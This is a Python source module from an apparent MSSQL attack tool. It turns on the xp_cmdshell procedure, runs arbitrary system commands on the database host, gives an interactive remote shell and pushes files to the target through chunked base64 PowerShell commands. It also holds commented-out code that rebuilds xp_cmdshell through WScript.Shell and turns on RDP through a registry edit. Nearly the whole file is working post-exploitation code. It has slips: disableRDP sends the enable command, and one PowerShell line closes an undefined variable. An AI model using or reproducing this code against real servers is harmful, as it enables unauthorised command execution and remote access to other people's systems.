#!/usr/bin/python
# -*- coding: utf-8 -*-

import logging
from Mssql import Mssql
from Utils import cleanString, ErrorClass,checkOptionsGivenByTheUser, ErrorClass, getBinaryDataFromFile
from Constants import *
import base64

class Xpcmdshell (Mssql):
	'''
	To get a shell
	'''
	#CONSTANTES
	#ENABLE + DISABLE XPCMDSHELL 2005 and 2008 version 
	REQ_ENABLE_XPCMDSHELL1_V2008 = "exec master.dbo.sp_configure 'show advanced options', 1"
	REQ_ENABLE_XPCMDSHELL2_V2008 = "RECONFIGURE"
	REQ_ENABLE_XPCMDSHELL3_V2008 = "exec master.dbo.sp_configure 'xp_cmdshell', 1"
	REQ_ENABLE_XPCMDSHELL4_V2008 = "RECONFIGURE"
	REQ_DISABLE_XPCMDSHELL1_V2008 = "exec master.dbo.sp_configure 'xp_cmdshell', 0"
	REQ_DISABLE_XPCMDSHELL2_V2008 = "RECONFIGURE"
	REQ_DISABLE_XPCMDSHELL3_V2008 = "exec master.dbo.sp_configure 'show advanced options', 0"
	REQ_DISABLE_XPCMDSHELL4_V2008 = "RECONFIGURE"
	#ENABLE + DISABLE XPCMDSHELL 2000 version 
	REQ_ENABLE_XPCMDSHELL1_V2000 = "exec sp_addextendedproc 'xp_cmdshell','xp_log70.dll'"
	REQ_ENABLE_XPCMDSHELL2_V2000 = "exec sp_addextendedproc 'xp_cmdshell', 'C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\xplog70.dll';"
	REQ_DISABLE_XPCMDSHELL1_V2000 = "exec sp_dropextendedproc 'xp_cmdshell'"
	#XPCMDSHELL Request
	REQ_XPCMDSHELL_CMD = "EXEC xp_cmdshell \'{0}\'"
	#Rebuild XPCMDSHELL
	REQ_REBUILD_XPCMDSHELL  = "CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS;DECLARE @result int, @OLEResult int, @RunResult int;DECLARE @ShellID int;EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT;IF @OLEResult <> 0 SELECT @result = @OLEResult;IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult);EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait;IF @OLEResult <> 0 SELECT @result = @OLEResult;IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLEResult);EXECUTE @OLEResult = sp_OADestroy @ShellID;return @result;"
	#Enable RDP
	SYS_CMD_ENABLE_RDP = "REG ADD 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f"
	SYS_CMD_DISABLE_RDP = "REG ADD 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 1 /f"
	#ENCODAGE
	ENCODAGE = 'utf-8'
	#ERRORS
	
	def __init__(self, args):
		'''
		Constructor
		'''
		Mssql.__init__(self, args=args)
		self.output = args['print']
		self.args = args
	
	def enableXpcmdshell (self):
		'''
		Re-enable the xp_cmdshell stored procedure in 2005 and 2008 and 2000
		return True if Ok, otherwise returns an Error object
		'''
		logging.info("Re-enabling the xp_cmdshell stored procedure...")
		if self.isThe2008Version() or self.isThe2005Version() or self.isThe2012Version() or self.isThe2014Version():
			data = self.executeRequest(self.REQ_ENABLE_XPCMDSHELL1_V2008,noResult=True)
			if isinstance(data,Exception): return data
			data = self.executeRequest(self.REQ_ENABLE_XPCMDSHELL2_V2008,noResult=True)
			if isinstance(data,Exception): return data
			data = self.executeRequest(self.REQ_ENABLE_XPCMDSHELL3_V2008,noResult=True)
			if isinstance(data,Exception): return data
			data = self.executeRequest(self.REQ_ENABLE_XPCMDSHELL4_V2008,noResult=True)
			if isinstance(data,Exception): return data
		elif self.isThe2000Version():
			data = self.executeRequest(self.REQ_ENABLE_XPCMDSHELL1_V2000,noResult=True)
			if isinstance(data,Exception): return data
			data = self.executeRequest(self.REQ_ENABLE_XPCMDSHELL2_V2000,noResult=True)
			if isinstance(data,Exception): return data
		else:
			logging.warning ("Impossible to determine the remote database version from the following version string: '{0}'".format(self.getCompleteVersion()))
		logging.info("The xp_cmdshell stored procedure is re-enabled")
		return True
		
	def disableXpcmdshell (self):
		'''
		Disable the xp_cmdshell stored procedure in 2005 and 2008 and 2000
		return True if Ok, otherwise returns an Error object
		'''
		logging.info("Disabling the xp_cmdshell stored procedure...")
		if self.isThe2008Version() or self.isThe2005Version() or self.isThe2012Version() or self.isThe2014Version():
			data = self.executeRequest(self.REQ_DISABLE_XPCMDSHELL1_V2008,noResult=True)
			if isinstance(data,Exception): return data
			data = self.executeRequest(self.REQ_DISABLE_XPCMDSHELL2_V2008,noResult=True)
			if isinstance(data,Exception): return data
			data = self.executeRequest(self.REQ_DISABLE_XPCMDSHELL3_V2008,noResult=True)
			if isinstance(data,Exception): return data
			data = self.executeRequest(self.REQ_DISABLE_XPCMDSHELL4_V2008,noResult=True)
			if isinstance(data,Exception): return data
		elif self.isThe2000Version():
			data = self.executeRequest(self.REQ_DISABLE_XPCMDSHELL1_V2000,noResult=True)
			if isinstance(data,Exception): return data
		else:
			logging.warning ("Impossible to determine the remote database version from the following version string: '{0}'".format(self.getCompleteVersion()))
		logging.info("The xp_cmdshell stored procedure is disabled")
		return True
		
	"""
	def rebuildXpcmdshell (self):
		'''
		Rebuild xp_cmdshell if it was deleted
		Return True or an Error
		'''
		logging.info("Rebuilding xp_cmdshell...".format(cmd, self.host))
		data = self.executeRequest(self.REQ_REBUILD_XPCMDSHELL,noResult=True)
		if isinstance(data,Exception): return data
		logging.info("The xp_cmdshell stored procedure has been rebuilt")
	"""
		
	def executeCmd (self,cmd=None, printResponse=True, printCMD=True):
		'''
		Execute a command
		Return error if error
		Otherwise return output data
		'''
		if printCMD==True:
			logging.info("Executing the '{0}' system command on the {1} server...".format(cmd, self.host))
		data = self.executeRequest(self.REQ_XPCMDSHELL_CMD.format(cmd),ld=['output'])
		if isinstance(data,Exception): return data
		else: 
			output = ""
			for e in data: 
				if e['output'] != None: output = output + e['output'].encode(self.ENCODAGE) + '\n'
			logging.debug("Output: '{0}' (perhaps truncated in this debug output)".format(repr(output[:400])))
			if printResponse == True : self.output.printOSCmdOutput('{0}'.format(output))
		logging.info("The system command has been executed")
		return output 
		
	"""
	def enableRDP (self):
		'''
		Enable RDP if no enabled
		Return True if enabled, otherwise False
		'''
		logging.info("Enabling RDP on the {0} server...".format(self.host))
		data = self.executeCmd(self.SYS_CMD_ENABLE_RDP)
		if isinstance(data,Exception):
			print data
			return False
		logging.info("RDP enabled now".format(self.host))
		return True
	"""
		
	"""
	def disableRDP (self):
		'''
		Disable RDP if enabled
		Return True if disabled, otherwise False
		'''
		logging.info("Disabling RDP on the {0} server...".format(self.host))
		data = self.executeCmd(self.SYS_CMD_ENABLE_RDP)
		if isinstance(data,Exception):
			print data
			return False
		logging.info("RDP disabled now".format(self.host))
		return True
	"""
	
	def getInteractiveShell(self):
		'''
		Give an interactive shell to the user
		Return True if Ok, otherwise return False
		'''
		while False == False:
			try:
				cmd = raw_input('{0}$ '.format(self.host))
				output = self.executeCmd (cmd=cmd, printResponse=True)
				if isinstance(output,Exception):
					logging.critical("Error: {0}".format(output))
					return False
			except KeyboardInterrupt:
				return True
		return False
		
	def uploadFileWithPowershell(self, localFilePath, remoteFilePath, width=5000):
		'''
		Copy content of localFilePath into remoteFilePath on the target.
		'''
		PS_CMD_WRITE_CREATE = """	powershell -c 
									$By=[System.Convert]::FromBase64String(''{1}'');
									$fi=New-Object System.IO.FileStream(''{0}'',''Create'');
									$bi=New-Object System.IO.BinaryWriter($fi);
									$bi.write($By);
									$b.Close();
		"""
		PS_CMD_WRITE_APPEND ="""powershell -c 
								$By=[System.Convert]::FromBase64String(''{1}'');
								$fi=New-Object System.IO.FileStream(''{0}'',''Append'',''Write'');
								$bi=New-Object System.IO.BinaryWriter($fi);
								$bi.write($By);
								$bi.Close();
		"""
		logging.info("Uploading {0} on the target in {1} with powershell commands".format(localFilePath, remoteFilePath))
		rawData = getBinaryDataFromFile(localFilePath)
		rawDataSplitted = [rawData[i:i + width] for i in range(0, len(rawData), width)]
		rawDataSplittedSize = len(rawDataSplitted)
		logging.info("{0} powershell command(s) will be executed on the target for creating the file".format(rawDataSplittedSize))
		for i, aRawData in enumerate(rawDataSplitted):
			if i == 0:
				#we create the file with powershell
				cmd = PS_CMD_WRITE_CREATE.format(remoteFilePath, base64.b64encode(aRawData)).replace('\t','').replace('\n','')
				status = self.executeCmd (cmd=cmd, printResponse=False, printCMD=False)
				if isinstance(status,Exception): return status
			else:
				#we append data to file
				cmd = PS_CMD_WRITE_APPEND.format(remoteFilePath, base64.b64encode(aRawData)).replace('\t','').replace('\n','')
				status = self.executeCmd (cmd=cmd, printResponse=False, printCMD=False)
				if isinstance(status,Exception): return status
			logging.info("{0}/{1} done".format(i+1,rawDataSplittedSize))
		logging.info("Upload finished")
		return True
		
	def testAll (self):
		'''
		Test all functions
		'''
		self.args['print'].subtitle("Can we execute system commands with xpcmdshell (directly) ?")
		status = self.executeCmd (cmd=DEFAULT_SYS_CMD, printResponse=False)
		if isinstance(status,Exception):
			self.args['print'].badNews("KO")
			self.args['print'].subtitle("Can we re-enable xpcmdshell to use xpcmdshell ?")
			status = self.enableXpcmdshell()
			if isinstance(status,Exception):
				self.args['print'].badNews("KO")
			else:
				self.args['print'].goodNews("OK")
				self.disableXpcmdshell()
		else :
			self.args['print'].goodNews("OK")
		
		
def runXpCmdShellModule(args):
	'''
	Run the XpCmdShell module
	'''
	noErrorWithEnableXpcmdshell = True
	if checkOptionsGivenByTheUser(args,["test-module","shell","enable-xpcmdshell","disable-xpcmdshell","put-file"],checkAccount=True) == False : return EXIT_MISS_ARGUMENT
	xpcmdshell = Xpcmdshell(args)
	xpcmdshell.connect()
	if args["test-module"] == True: xpcmdshell.testAll()
	if args["put-file"] != None:
		args['print'].title("Try to copy the local file {0} to {1} with powershell".format(args['put-file'][0],args['put-file'][1]))
		data = xpcmdshell.uploadFileWithPowershell(args['put-file'][0],args['put-file'][1], width=int(args['put-file'][2]))
		if data == True:
			args['print'].goodNews("The local file {0} has been copied in {1}".format(args['put-file'][0],args['put-file'][1]))
		else:
			args['print'].badNews("Impossible to put the local file {0} to {1}: '{2}'".format(args['put-file'][0],args['put-file'][1],data))
	if args["enable-xpcmdshell"] == True:
		args['print'].title("Re-enable Xpcmdshell")
		noErrorWithEnableXpcmdshell = xpcmdshell.enableXpcmdshell()
		if noErrorWithEnableXpcmdshell == True: args['print'].goodNews("Xpcmdshell is re-enabled")
		else: args['print'].badNews("Xpcmdshell is NOT re-enabled")
	if args["shell"] == True:
		args['print'].title("Trying to get a shell thanks to xpcmdshell")
		status = xpcmdshell.getInteractiveShell()
		if status == True:
			args['print'].goodNews("Good Bye :)")
		else :
			args['print'].badNews("Impossible to get a shell on the database")
	if args["disable-xpcmdshell"] == True:
		if noErrorWithEnableXpcmdshell == True: 
			args['print'].title("Disable Xpcmdshell")
			status = xpcmdshell.disableXpcmdshell()
			if status == True: args['print'].goodNews("Xpcmdshell is disabled")
			else: args['print'].badNews("Xpcmdshell is NOT disabled: {0}".format(status))
	xpcmdshell.closeConnection()
